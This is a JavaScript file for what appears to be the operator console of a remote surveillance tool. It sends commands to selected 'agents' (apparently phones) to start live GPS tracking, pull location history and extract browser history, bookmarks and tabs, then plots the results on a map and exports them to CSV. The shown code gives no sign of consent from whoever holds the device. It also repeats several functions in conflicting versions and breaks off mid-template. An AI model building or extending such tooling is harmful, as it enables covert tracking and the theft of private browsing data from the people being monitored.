// ==================== KEYBOARD SHORTCUTS ====================

function setupTabKeyboardShortcuts() {
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey) {
            const tabs = document.querySelectorAll('.output-tabs .tab');
            const activeTab = document.querySelector('.output-tabs .tab.active');
            let currentIndex = Array.from(tabs).indexOf(activeTab);
            
            if (e.key === 'ArrowRight' || e.key === 'ArrowDown') {
                e.preventDefault();
                const nextIndex = (currentIndex + 1) % tabs.length;
                tabs[nextIndex]?.click();
            } else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
                e.preventDefault();
                const prevIndex = (currentIndex - 1 + tabs.length) % tabs.length;
                tabs[prevIndex]?.click();
            }
        }
        
        if (e.ctrlKey && e.key >= '1' && e.key <= '9') {
            e.preventDefault();
            const tabs = document.querySelectorAll('.output-tabs .tab');
            const index = parseInt(e.key) - 1;
            if (tabs[index]) tabs[index].click();
        }
    });
}


// ==================== LOCATION TRACKING UI ====================

function startLocationTracking() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    
    const interval = prompt('Enter tracking interval in seconds (5-60):', '10');
    if (!interval) return;
    
    const seconds = parseInt(interval);
    if (seconds < 5 || seconds > 60) {
        addOutputLine('⚠️ Interval must be between 5 and 60 seconds', 'error');
        return;
    }
    
    sendCommand('LOCATION_TRACK_START', String(seconds));
    addOutputLine(`📍 Starting location tracking every ${seconds} seconds for ${selectedAgent}`, 'info');
    switchToTab('location');
}

function stopLocationTracking() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    sendCommand('LOCATION_TRACK_STOP');
    addOutputLine(`📍 Stopping location tracking for ${selectedAgent}`, 'info');
}

function getLocationHistory() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    
    const limit = prompt('Number of history entries to fetch (10-500):', '50');
    if (!limit) return;
    
    const count = parseInt(limit);
    if (count < 1 || count > 500) {
        addOutputLine('⚠️ Limit must be between 1 and 500', 'error');
        return;
    }
    
    sendCommand('LOCATION_HISTORY', String(count));
    addOutputLine(`📍 Fetching last ${count} location history entries for ${selectedAgent}`, 'info');
}

function getLocationTrackStatus() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    sendCommand('LOCATION_TRACK_STATUS');
}

// ==================== BROWSER UI ====================

function getBrowserInfo() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    sendCommand('BROWSER_INFO');
    addOutputLine(`🌐 Fetching browser info for ${selectedAgent}`, 'info');
}

function getBrowserHistory() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    const browser = prompt('Enter browser package (leave empty for all):', '');
    if (browser !== null) {
        sendCommand('BROWSER_HISTORY', browser);
        addOutputLine(`🌐 Fetching browser history for ${selectedAgent}`, 'info');
    }
}

function getBrowserBookmarks() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    const browser = prompt('Enter browser package (leave empty for all):', '');
    if (browser !== null) {
        sendCommand('BROWSER_BOOKMARKS', browser);
        addOutputLine(`🔖 Fetching browser bookmarks for ${selectedAgent}`, 'info');
    }
}

function getBrowserTabs() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    const browser = prompt('Enter browser package (leave empty for all):', '');
    if (browser !== null) {
        sendCommand('BROWSER_TABS', browser);
        addOutputLine(`📑 Fetching browser tabs for ${selectedAgent}`, 'info');
    }
}

function getBrowserAll() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    sendCommand('BROWSER_ALL');
    addOutputLine(`🌐 Fetching all browser data for ${selectedAgent}`, 'info');
}

// ==================== HANDLE LOCATION TRACKING DATA ====================

// ==================== HANDLE LOCATION TRACKING DATA ====================
function handleLocationTrackingData(data) {
    console.log('📍 Location tracking data received:', data);
    console.log('   Type:', data.type);
    
    // ✅ FIX: Initialize map if not already done
    if (!isMapInitialized) {
        console.log('🗺️ Initializing map first...');
        initLocationMap();
    }
    
    try {
        // ✅ Handle berbagai format data yang mungkin datang dari backend
        switch (data.type) {
            case 'location_update':
                console.log('📍 Location update received');
                if (data.location) {
                    console.log('   Using data.location');
                    updateMapWithLocation(data.location);
                } else if (data.data) {
                    console.log('   Using data.data');
                    updateMapWithLocation(data.data);
                } else {
                    handleLocationUpdateEnhanced(data);
                }
                break;
                
            case 'location_status':
                console.log('📍 Location status received');
                handleLocationStatusEnhanced(data);
                break;
                
            case 'location_history':
                console.log('📍 Location history received, entries:', data.locations?.length || data.data?.length || 0);
                handleLocationHistoryEnhanced(data);
                break;
                
            default:
                console.warn('⚠️ Unknown location data type:', data.type);
                // Try to extract location anyway
                if (data.location) {
                    updateMapWithLocation(data.location);
                } else if (data.data && typeof data.data === 'object' && !Array.isArray(data.data)) {
                    updateMapWithLocation(data.data);
                }
        }
    } catch (e) {
        console.error('❌ Error handling location data:', e);
        console.error('   Raw data:', data);
    }
}

// ==================== ENHANCED LOCATION STATUS ====================
function handleLocationStatusEnhanced(data) {
    console.log('📍 Location status received:', data);
    
    const container = document.getElementById('location-content');
    if (!container) return;
    
    const result = data.data || {};
    const isTracking = result.is_tracking || false;
    const interval = result.interval || 0;
    const lastLocation = result.last_location || {};
    const historyCount = result.history_count || 0;
    
    // If there's a last location, show it on map
    if (lastLocation.latitude && lastLocation.longitude) {
        console.log('📍 Showing last location:', lastLocation.latitude, lastLocation.longitude);
        updateMapWithLocation(lastLocation);
    }
    
    // Update status card
    let statusCard = container.querySelector('.tracking-status-card');
    if (!statusCard) {
        statusCard = document.createElement('div');
        statusCard.className = 'tracking-status-card';
        statusCard.style.cssText = `
            background: #0d1520;
            border-radius: 8px;
            padding: 12px 16px;
            border: 1px solid ${isTracking ? '#51cf66' : '#1a2633'};
            margin-bottom: 12px;
        `;
        container.prepend(statusCard);
    }
    
    statusCard.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
            <span style="color:${isTracking ? '#51cf66' : '#6b7a8a'};font-weight:bold;">
                📡 ${isTracking ? '🟢 Tracking Active' : '🔴 Tracking Stopped'}
            </span>
            <span style="color:#6b7a8a;font-size:12px;">
                ${isTracking ? `⏱️ Interval: ${interval}s` : ''}
                ${!isTracking && historyCount ? `📊 History: ${historyCount} entries` : ''}
                📍 ${locationPath.length} points
            </span>
        </div>
        ${lastLocation.latitude ? `
        <div style="display:flex;gap:12px;margin-top:8px;flex-wrap:wrap;">
            <span style="color:#4a5a6a;font-size:11px;">
                📍 <span style="color:#00d2ff;font-family:'Courier New',monospace;">${lastLocation.latitude}, ${lastLocation.longitude}</span>
            </span>
            <span style="color:#4a5a6a;font-size:11px;">
                🎯 Accuracy: ${lastLocation.accuracy || 'N/A'}m
            </span>
            <a href="https://maps.google.com/?q=${lastLocation.latitude},${lastLocation.longitude}" target="_blank" style="color:#00d2ff;font-size:11px;text-decoration:none;">
                🗺️ Open Maps
            </a>
        </div>
        ` : `
        <div style="color:#6b7a8a;font-size:12px;text-align:center;padding:8px;">
            ${isTracking ? '⏳ Waiting for first location update...' : '📍 No location data available'}
        </div>
        `}
    `;
    
    // Show tracking status in output
    if (isTracking) {
        addOutputLine(`📍 Tracking ACTIVE - interval: ${interval}s, points: ${locationPath.length}`, 'success');
    } else {
        addOutputLine(`📍 Tracking STOPPED - ${locationPath.length} points recorded`, 'info');
    }
    
    // Update map status
    const statusEl = document.getElementById('map-status');
    if (statusEl) {
        if (isTracking) {
            statusEl.innerHTML = `🟢 Tracking ACTIVE (${interval}s interval) - ${locationPath.length} points`;
            statusEl.style.color = '#51cf66';
        } else {
            statusEl.innerHTML = `🔴 Tracking STOPPED (${locationPath.length} points recorded)`;
            statusEl.style.color = '#ff6b6b';
        }
    }
}

// ==================== ENHANCED LOCATION HISTORY ====================
function handleLocationHistoryEnhanced(data) {
    console.log('📜 Location history received:', data);
    
    const container = document.getElementById('location-content');
    if (!container) return;
    
    const result = data.data || {};
    const history = result.history || [];
    const count = result.count || history.length;
    const total = result.total || 0;
    
    addOutputLine(`📜 Location history: ${count} of ${total} entries`, 'info');
    
    // Add to map
    if (history.length > 0) {
        history.forEach(loc => {
            if (loc.latitude && loc.longitude) {
                updateMapWithLocation(loc);
            }
        });
        addOutputLine(`📍 Added ${history.length} locations to map`, 'info');
    }
    
    // Create history section
    let historySection = container.querySelector('.location-history-section');
    if (!historySection) {
        historySection = document.createElement('div');
        historySection.className = 'location-history-section';
        historySection.style.cssText = `
            margin-top: 12px;
            border-top: 1px solid #1a2633;
            padding-top: 12px;
        `;
        container.appendChild(historySection);
    }
    
    let header = historySection.querySelector('.history-header');
    if (!header) {
        header = document.createElement('div');
        header.className = 'history-header';
        header.style.cssText = `
            display:flex;
            justify-content:space-between;
            align-items:center;
            margin-bottom:8px;
            color:#6b7a8a;
            font-size:12px;
        `;
        historySection.appendChild(header);
    }
    header.innerHTML = `
        <span>📜 Location History (${count} of ${total} entries)</span>
        <div style="display:flex;gap:6px;">
            <button onclick="exportLocationHistory()" style="background:none;border:none;color:#00d2ff;cursor:pointer;font-size:11px;">📤 Export</button>
            <button onclick="clearLocationHistoryUI()" style="background:none;border:none;color:#ff6b6b;cursor:pointer;font-size:11px;">🗑️ Clear</button>
        </div>
    `;
    
    let list = historySection.querySelector('.history-list');
    if (!list) {
        list = document.createElement('div');
        list.className = 'history-list';
        list.style.cssText = `
            max-height: 200px;
            overflow-y: auto;
            font-size: 11px;
            font-family: 'Courier New', monospace;
        `;
        historySection.appendChild(list);
    }
    
    list.innerHTML = '';
    
    if (history.length === 0) {
        list.innerHTML = `<div style="color:#6b7a8a;text-align:center;padding:16px;">No history entries</div>`;
        return;
    }
    
    // Show newest first
    const reversed = [...history].reverse();
    reversed.slice(0, 100).forEach((loc, index) => {
        const div = document.createElement('div');
        div.style.cssText = `
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 4px 8px;
            border-bottom: 1px solid #0a0e17;
            background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};
            border-radius: 3px;
            transition: background 0.2s;
        `;
        div.onmouseover = function() { this.style.background = '#1a2633'; };
        div.onmouseout = function() { this.style.background = index % 2 === 0 ? '#0d1520' : 'transparent'; };
        
        const time = loc.timestamp || loc.time || new Date().toLocaleString();
        div.innerHTML = `
            <span style="color:#4a5a6a;font-size:10px;min-width:80px;">${time}</span>
            <span style="color:#00d2ff;font-weight:bold;">${loc.latitude}, ${loc.longitude}</span>
            <span style="color:#6b7a8a;font-size:10px;min-width:40px;">${loc.accuracy || 'N/A'}m</span>
            <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#ffd93d;text-decoration:none;font-size:14px;">🗺️</a>
            <button onclick="copyToClipboard('${loc.latitude}, ${loc.longitude}')" style="background:none;border:none;color:#6b7a8a;cursor:pointer;font-size:12px;">📋</button>
        `;
        list.appendChild(div);
    });
}

// ==================== ENHANCED LOCATION UPDATE ====================
function handleLocationUpdateEnhanced(data) {
    console.log('📍 Location update received:', data);
    
    const location = data.data || {};
    
    if (location.latitude && location.longitude) {
        updateMapWithLocation(location);
        const lat = typeof location.latitude === 'number' ? location.latitude.toFixed(6) : location.latitude;
        const lng = typeof location.longitude === 'number' ? location.longitude.toFixed(6) : location.longitude;
        addOutputLine(`📍 Live update: ${lat}, ${lng}`, 'info');
        
        // Update status card
        const container = document.getElementById('location-content');
        if (container) {
            let statusCard = container.querySelector('.tracking-status-card');
            if (statusCard) {
                const time = location.time || new Date().toLocaleTimeString();
                const coordSpan = statusCard.querySelector('[style*="color:#00d2ff"]');
                if (coordSpan) {
                    coordSpan.textContent = `${location.latitude}, ${location.longitude}`;
                }
                // Update points count
                const pointsSpan = statusCard.querySelector('.tracking-status-card span:last-child');
                if (pointsSpan) {
                    pointsSpan.textContent = `📍 ${locationPath.length} points`;
                }
            }
        }
    }
}

// ==================== START LOCATION TRACKING ====================
function startLocationTracking() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    
    // ✅ TAMBAHKAN PILIHAN INTERVAL LEBIH FLEKSIBEL
    const interval = prompt('📍 Tracking interval in seconds:\n' +
        '  5  - Super accurate (more battery)\n' +
        '  10 - Recommended\n' +
        '  30 - Battery saver\n' +
        '  60 - Minimal tracking', '10');
    if (!interval) return;
    
    const seconds = parseInt(interval);
    if (seconds < 5 || seconds > 60) {
        addOutputLine('⚠️ Interval must be between 5 and 60 seconds', 'error');
        return;
    }
    
    initLocationMap();
    isTrackingActive = true;
    trackingInterval = seconds;
    
    sendCommand('LOCATION_TRACK_START', String(seconds));
    addOutputLine(`📍 Starting location tracking every ${seconds} seconds for ${selectedAgent}`, 'info');
    addOutputLine(`🛰️ GPS accuracy will be shown in Location tab`, 'info');
    
    // ✅ AUTO GET GPS DETAIL
    setTimeout(() => {
        sendCommand('GPS_DETAIL');
    }, 1000);
    
    switchToTab('location');
}

// ==================== STOP LOCATION TRACKING ====================
function stopLocationTracking() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    isTrackingActive = false;
    sendCommand('LOCATION_TRACK_STOP');
    addOutputLine(`⏹️ Stopping location tracking for ${selectedAgent}`, 'info');
    
    const statusEl = document.getElementById('map-status');
    if (statusEl) {
        statusEl.innerHTML = `🔴 Tracking STOPPED (${locationPath.length} points recorded)`;
        statusEl.style.color = '#ff6b6b';
    }
}

// ==================== GET LOCATION HISTORY ====================
function getLocationHistory() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    
    const limit = prompt('📜 Number of history entries to fetch (10-500):', '50');
    if (!limit) return;
    
    const count = parseInt(limit);
    if (count < 1 || count > 500) {
        addOutputLine('⚠️ Limit must be between 1 and 500', 'error');
        return;
    }
    
    initLocationMap();
    sendCommand('LOCATION_HISTORY', String(count));
    addOutputLine(`📜 Fetching last ${count} location history entries for ${selectedAgent}`, 'info');
}

// ==================== GET LOCATION TRACK STATUS ====================
function getLocationTrackStatus() {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }
    sendCommand('LOCATION_TRACK_STATUS');
}

// ==================== CLEAR LOCATION PATH ====================
function clearLocationPath() {
    locationPath = [];
    if (locationPolyline) {
        locationPolyline.setLatLngs([]);
    }
    locationTrackingData = [];
    mapCenterSet = false;
    addOutputLine('🗑️ Location path cleared', 'info');
    
    const statusEl = document.getElementById('map-status');
    if (statusEl) {
        statusEl.innerHTML = '🗑️ Cleared - waiting for new data...';
        statusEl.style.color = '#6b7a8a';
    }
    
    // Clear info panel
    const container = document.getElementById('location-content');
    if (container) {
        const panel = container.querySelector('.location-info-panel');
        if (panel) panel.remove();
    }
}

// ==================== EXPORT LOCATION HISTORY ====================
function exportLocationHistory() {
    if (locationTrackingData.length === 0) {
        addOutputLine('⚠️ No location data to export', 'error');
        return;
    }
    
    let csv = 'Timestamp,Latitude,Longitude,Accuracy,Provider,Altitude,Speed,Bearing\n';
    locationTrackingData.forEach(loc => {
        const time = loc.time || loc.timestamp || new Date().toISOString();
        csv += `"${time}","${loc.latitude}","${loc.longitude}","${loc.accuracy || ''}","${loc.provider || ''}","${loc.altitude || ''}","${loc.speed || ''}","${loc.bearing || ''}"\n`;
    });
    
    downloadFile(csv, `location_history_${Date.now()}.csv`, 'text/csv');
    addOutputLine(`📤 Exported ${locationTrackingData.length} location points`, 'success');
}

// ==================== CLEAR LOCATION HISTORY UI ====================
function clearLocationHistoryUI() {
    const container = document.getElementById('location-content');
    if (container) {
        const list = container.querySelector('.history-list');
        if (list) {
            list.innerHTML = '';
            addOutputLine('🗑️ Location history cleared from UI', 'info');
        }
    }
}


// Enhanced location update handler
function handleLocationUpdateEnhanced(data) {
    const location = data.data || {};
    
    // Update map with location
    if (location.latitude && location.longitude) {
        updateMapWithLocation(location);
    }
    
    // Update status card if exists
    const container = document.getElementById('location-content');
    if (!container) return;
    
    // Add/update status
    let statusCard = container.querySelector('.tracking-status-card');
    if (!statusCard) {
        statusCard = document.createElement('div');
        statusCard.className = 'tracking-status-card';
        statusCard.style.cssText = `
            background: #0d1520;
            border-radius: 8px;
            padding: 10px 14px;
            border: 1px solid #51cf66;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        `;
        container.prepend(statusCard);
    }
    
    const time = location.time || new Date().toLocaleTimeString();
    statusCard.innerHTML = `
        <span style="color:#51cf66;font-weight:bold;">🟢 Live Tracking</span>
        <span style="color:#6b7a8a;font-size:12px;">
            📍 ${location.latitude}, ${location.longitude}
        </span>
        <span style="color:#4a5a6a;font-size:11px;font-family:'Courier New',monospace;">
            🕐 ${time}
        </span>
        <span style="color:#6b7a8a;font-size:11px;">
            📊 ${locationPath.length} points
        </span>
    `;
    
    // Add to output
    addOutputLine(`📍 Live update: ${location.latitude}, ${location.longitude}`, 'info');
}

// ==================== LOCATION TRACKING UI BUTTONS ====================

// Add these buttons to the controls section in HTML or dynamically
function addLocationTrackingButtons() {
    const controlsRow = document.querySelector('.controls-row');
    if (!controlsRow) return;
    
    const btnGroup = document.createElement('div');
    btnGroup.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap;';
    btnGroup.innerHTML = `
        <button onclick="startLocationTracking()" style="padding:6px 14px;background:#51cf66;color:#0a0e17;border:none;border-radius:4px;cursor:pointer;font-weight:bold;font-size:12px;">
            📍 Track Start
        </button>
        <button onclick="stopLocationTracking()" style="padding:6px 14px;background:#ff6b6b;color:#0a0e17;border:none;border-radius:4px;cursor:pointer;font-weight:bold;font-size:12px;">
            ⏹️ Track Stop
        </button>
        <button onclick="getLocationTrackStatus()" style="padding:6px 14px;background:#1a2633;color:#c8d6e5;border:none;border-radius:4px;cursor:pointer;font-size:12px;">
            📊 Status
        </button>
        <button onclick="getLocationHistory()" style="padding:6px 14px;background:#1a2633;color:#c8d6e5;border:none;border-radius:4px;cursor:pointer;font-size:12px;">
            📜 History
        </button>
        <button onclick="clearLocationPath()" style="padding:6px 14px;background:#1a2633;color:#ff6b6b;border:none;border-radius:4px;cursor:pointer;font-size:12px;">
            🗑️ Clear Path
        </button>
    `;
    
    controlsRow.appendChild(btnGroup);
}

function clearLocationPath() {
    locationPath = [];
    if (locationPolyline) {
        locationPolyline.setLatLngs([]);
    }
    addOutputLine('🗑️ Location path cleared', 'info');
}

// ==================== ENHANCED LOCATION HISTORY ====================

function handleLocationHistoryData(data) {
    const container = document.getElementById('location-content');
    if (!container) return;
    
    const result = data.data || {};
    const history = result.history || [];
    const count = result.count || history.length;
    const total = result.total || 0;
    
    // Initialize map first
    initLocationMap();
    
    // Add history entries to path
    history.forEach(loc => {
        if (loc.latitude && loc.longitude) {
            updateMapWithLocation(loc);
        }
    });
    
    // Create history list
    let historySection = container.querySelector('.location-history-section');
    if (!historySection) {
        historySection = document.createElement('div');
        historySection.className = 'location-history-section';
        historySection.style.cssText = `
            margin-top: 12px;
            border-top: 1px solid #1a2633;
            padding-top: 12px;
        `;
        container.appendChild(historySection);
    }
    
    let header = historySection.querySelector('.history-header');
    if (!header) {
        header = document.createElement('div');
        header.className = 'history-header';
        header.style.cssText = `
            display:flex;
            justify-content:space-between;
            align-items:center;
            margin-bottom:8px;
            color:#6b7a8a;
            font-size:12px;
        `;
        historySection.appendChild(header);
    }
    header.innerHTML = `
        <span>📜 Location History (${count} of ${total} entries)</span>
        <div style="display:flex;gap:6px;">
            <button onclick="exportLocationHistory()" style="background:none;border:none;color:#00d2ff;cursor:pointer;font-size:11px;">📤 Export</button>
            <button onclick="clearLocationHistoryUI()" style="background:none;border:none;color:#ff6b6b;cursor:pointer;font-size:11px;">🗑️ Clear</button>
        </div>
    `;
    
    let list = historySection.querySelector('.history-list');
    if (!list) {
        list = document.createElement('div');
        list.className = 'history-list';
        list.style.cssText = `
            max-height: 200px;
            overflow-y: auto;
            font-size: 11px;
            font-family: 'Courier New', monospace;
        `;
        historySection.appendChild(list);
    }
    
    // Clear and repopulate
    list.innerHTML = '';
    
    if (history.length === 0) {
        list.innerHTML = `<div style="color:#6b7a8a;text-align:center;padding:16px;">No history entries</div>`;
        return;
    }
    
    history.forEach((loc, index) => {
        const div = document.createElement('div');
        div.style.cssText = `
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 4px 8px;
            border-bottom: 1px solid #0a0e17;
            background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};
            border-radius: 3px;
            transition: background 0.2s;
        `;
        div.onmouseover = function() { this.style.background = '#1a2633'; };
        div.onmouseout = function() { this.style.background = index % 2 === 0 ? '#0d1520' : 'transparent'; };
        
        const time = loc.timestamp || loc.time || new Date().toLocaleString();
        div.innerHTML = `
            <span style="color:#4a5a6a;font-size:10px;min-width:80px;">${time}</span>
            <span style="color:#00d2ff;font-weight:bold;">${loc.latitude}, ${loc.longitude}</span>
            <span style="color:#6b7a8a;font-size:10px;min-width:40px;">${loc.accuracy || 'N/A'}m</span>
            <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#ffd93d;text-decoration:none;font-size:14px;">🗺️</a>
            <button onclick="copyToClipboard('${loc.latitude}, ${loc.longitude}')" style="background:none;border:none;color:#6b7a8a;cursor:pointer;font-size:12px;">📋</button>
        `;
        list.appendChild(div);
    });
}

// ==================== EXPORT LOCATION HISTORY ====================

function exportLocationHistory() {
    if (locationTrackingData.length === 0) {
        addOutputLine('⚠️ No location data to export', 'error');
        return;
    }
    
    let csv = 'Timestamp,Latitude,Longitude,Accuracy,Provider\n';
    locationTrackingData.forEach(loc => {
        const time = loc.time || loc.timestamp || new Date().toISOString();
        csv += `"${time}","${loc.latitude}","${loc.longitude}","${loc.accuracy || ''}","${loc.provider || ''}"\n`;
    });
    
    downloadFile(csv, `location_history_${Date.now()}.csv`, 'text/csv');
    addOutputLine(`📤 Exported ${locationTrackingData.length} location points`, 'success');
}

// ==================== FIX LOCATION STATUS ====================

function handleLocationStatus(data) {
    const container = document.getElementById('location-content');
    if (!container) return;
    
    const result = data.data || {};
    const isTracking = result.is_tracking || false;
    const interval = result.interval || 0;
    const lastLocation = result.last_location || {};
    
    // Initialize map
    initLocationMap();
    
    // If there's a last location, show it on map
    if (lastLocation.latitude && lastLocation.longitude) {
        updateMapWithLocation(lastLocation);
    }
    
    // Update status card
    let statusCard = container.querySelector('.tracking-status-card');
    if (!statusCard) {
        statusCard = document.createElement('div');
        statusCard.className = 'tracking-status-card';
        statusCard.style.cssText = `
            background: #0d1520;
            border-radius: 8px;
            padding: 12px 16px;
            border: 1px solid ${isTracking ? '#51cf66' : '#1a2633'};
            margin-bottom: 12px;
        `;
        container.prepend(statusCard);
    }
    
    statusCard.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
            <span style="color:${isTracking ? '#51cf66' : '#6b7a8a'};font-weight:bold;">
                📡 ${isTracking ? '🟢 Tracking Active' : '🔴 Tracking Stopped'}
            </span>
            <span style="color:#6b7a8a;font-size:12px;">
                ${isTracking ? `⏱️ Interval: ${interval}s` : ''}
                ${!isTracking && result.history_count ? `📊 History: ${result.history_count} entries` : ''}
                📍 ${locationPath.length} points
            </span>
        </div>
        ${lastLocation.latitude ? `
        <div style="display:flex;gap:12px;margin-top:8px;flex-wrap:wrap;">
            <span style="color:#4a5a6a;font-size:11px;">
                📍 <span style="color:#00d2ff;font-family:'Courier New',monospace;">${lastLocation.latitude}, ${lastLocation.longitude}</span>
            </span>
            <span style="color:#4a5a6a;font-size:11px;">
                🎯 Accuracy: ${lastLocation.accuracy || 'N/A'}m
            </span>
            <a href="https://maps.google.com/?q=${lastLocation.latitude},${lastLocation.longitude}" target="_blank" style="color:#00d2ff;font-size:11px;text-decoration:none;">
                🗺️ Open Maps
            </a>
        </div>
        ` : `
        <div style="color:#6b7a8a;font-size:12px;text-align:center;padding:8px;">
            ${isTracking ? '⏳ Waiting for first location update...' : '📍 No location data available'}
        </div>
        `}
    `;
    
    // Show tracking status in output
    if (isTracking) {
        addOutputLine(`📍 Location tracking ACTIVE (interval: ${interval}s)`, 'success');
    } else {
        addOutputLine(`📍 Location tracking STOPPED`, 'info');
    }
}

// ==================== INIT ON PAGE LOAD ====================

// Add this to DOMContentLoaded
document.addEventListener('DOMContentLoaded', function() {
    // ... existing code ...
    
    // Add location tracking buttons
    addLocationTrackingButtons();
    
    // Initialize map when location tab is clicked
    const locationTab = document.querySelector('[data-tab="location"]');
    if (locationTab) {
        locationTab.addEventListener('click', function() {
            setTimeout(initLocationMap, 300);
        });
    }
    
    // Auto-init if location tab is active
    if (document.querySelector('[data-tab="location"].active')) {
        setTimeout(initLocationMap, 500);
    }
});

function handleLocationStatus(data) {
    const container = DOM.locationContent;
    if (!container) return;
    
    const result = data.data || {};
    const isTracking = result.is_tracking || false;
    const interval = result.interval || 0;
    const lastLocation = result.last_location || {};
    
    // Update or create status card
    let statusCard = container.querySelector('.tracking-status-card');
    if (!statusCard) {
        statusCard = document.createElement('div');
        statusCard.className = 'tracking-status-card';
        statusCard.style.cssText = `
            background: #0d1520;
            border-radius: 8px;
            padding: 12px 16px;
            border: 1px solid ${isTracking ? '#51cf66' : '#1a2633'};
            margin-bottom: 12px;
        `;
        container.prepend(statusCard);
    }
    
    statusCard.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
            <span style="color:${isTracking ? '#51cf66' : '#6b7a8a'};font-weight:bold;">
                📡 ${isTracking ? '🟢 Tracking Active' : '🔴 Tracking Stopped'}
            </span>
            <span style="color:#6b7a8a;font-size:11px;">
                ${isTracking ? `Interval: ${interval}s` : ''}
                ${!isTracking && result.history_count ? `History: ${result.history_count} entries` : ''}
            </span>
        </div>
        ${lastLocation.latitude ? `
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
            <div style="background:#0a0e17;padding:4px 8px;border-radius:4px;border:1px solid #1a2633;">
                <span style="color:#6b7a8a;font-size:9px;">Latitude</span>
                <div style="color:#c8d6e5;font-family:'Courier New',monospace;font-size:13px;">${lastLocation.latitude}</div>
            </div>
            <div style="background:#0a0e17;padding:4px 8px;border-radius:4px;border:1px solid #1a2633;">
                <span style="color:#6b7a8a;font-size:9px;">Longitude</span>
                <div style="color:#c8d6e5;font-family:'Courier New',monospace;font-size:13px;">${lastLocation.longitude}</div>
            </div>
        </div>
        <div style="margin-top:6px;display:flex;gap:8px;flex-wrap:wrap;">
            <span style="color:#6b7a8a;font-size:10px;">🎯 Accuracy: ${lastLocation.accuracy || 'N/A'}m</span>
            <span style="color:#6b7a8a;font-size:10px;">📶 Provider: ${lastLocation.provider || 'N/A'}</span>
            <span style="color:#6b7a8a;font-size:10px;">🕐 ${lastLocation.timestamp || ''}</span>
        </div>
        <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;">
            <a href="https://maps.google.com/?q=${lastLocation.latitude},${lastLocation.longitude}" target="_blank" style="color:#00d2ff;font-size:12px;text-decoration:none;background:#0a0e17;padding:4px 12px;border-radius:4px;border:1px solid #1a2633;">
                🗺️ Open in Maps
            </a>
            <button onclick="copyToClipboard('${lastLocation.latitude}, ${lastLocation.longitude}')" style="color:#c8d6e5;font-size:12px;background:#1a2633;border:none;padding:4px 12px;border-radius:4px;cursor:pointer;">
                📋 Copy
            </button>
        </div>
        ` : `
        <div style="color:#6b7a8a;font-size:12px;text-align:center;padding:8px;">
            ${isTracking ? '⏳ Waiting for first location update...' : '📍 No location data available'}
        </div>
        `}
    `;
    
    switchToTab('location');
}

function handleLocationHistoryData(data) {
    const container = DOM.locationContent;
    if (!container) return;
    
    const result = data.data || {};
    const history = result.history || [];
    const count = result.count || history.length;
    const total = result.total || 0;
    
    // Create history section
    let historySection = container.querySelector('.location-history-section');
    if (!historySection) {
        historySection = document.createElement('div');
        historySection.className = 'location-history-section';
        historySection.style.cssText = `
            margin-top: 12px;
            border-top: 1px solid #1a2633;
            padding-top: 12px;
        `;
        container.appendChild(historySection);
    }
    
    let header = historySection.querySelector('.history-header');
    if (!header) {
        header = document.createElement('div');
        header.className = 'history-header';
        header.style.cssText = `
            display:flex;
            justify-content:space-between;
            align-items:center;
            margin-bottom:8px;
            color:#6b7a8a;
            font-size:12px;
        `;
        historySection.appendChild(header);
    }
    header.innerHTML = `
        <span>📜 Location History (${count} of ${total} entries)</span>
        <button onclick="clearLocationHistoryUI()" style="background:none;border:none;color:#ff6b6b;cursor:pointer;font-size:11px;">🗑️ Clear</button>
    `;
    
    let list = historySection.querySelector('.history-list');
    if (!list) {
        list = document.createElement('div');
        list.className = 'history-list';
        list.style.cssText = `
            max-height: 350px;
            overflow-y: auto;
            font-size: 11px;
            font-family: 'Courier New', monospace;
        `;
        historySection.appendChild(list);
    }
    
    list.innerHTML = '';
    
    if (history.length === 0) {
        list.innerHTML = `<div style="color:#6b7a8a;text-align:center;padding:16px;">No history entries</div>`;
        return;
    }
    
    history.forEach((loc, index) => {
        const div = document.createElement('div');
        div.style.cssText = `
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 4px 8px;
            border-bottom: 1px solid #0a0e17;
            background: ${index % 2 === 0 ? '#0d1520' : 'transparent'};
            border-radius: 3px;
            transition: background 0.2s;
        `;
        div.onmouseover = function() { this.style.background = '#1a2633'; };
        div.onmouseout = function() { this.style.background = index % 2 === 0 ? '#0d1520' : 'transparent'; };
        
        const time = loc.timestamp ? new Date(loc.timestamp).toLocaleString() : 'N/A';
        div.innerHTML = `
